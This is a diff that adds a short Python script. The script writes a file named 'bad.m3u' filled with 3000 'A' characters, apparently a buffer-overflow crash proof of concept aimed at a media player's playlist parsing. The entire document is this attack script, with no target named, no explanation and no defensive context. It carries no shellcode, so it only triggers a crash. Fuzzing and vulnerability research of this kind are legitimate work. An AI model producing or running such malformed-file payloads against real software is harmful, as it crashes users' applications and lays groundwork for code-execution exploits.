@@ -1,0 +1,7 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+buffer = "\x41" * 3000
+payload=buffer
+f = open ("bad.m3u", "w")
+f.write(payload)
+f.close()
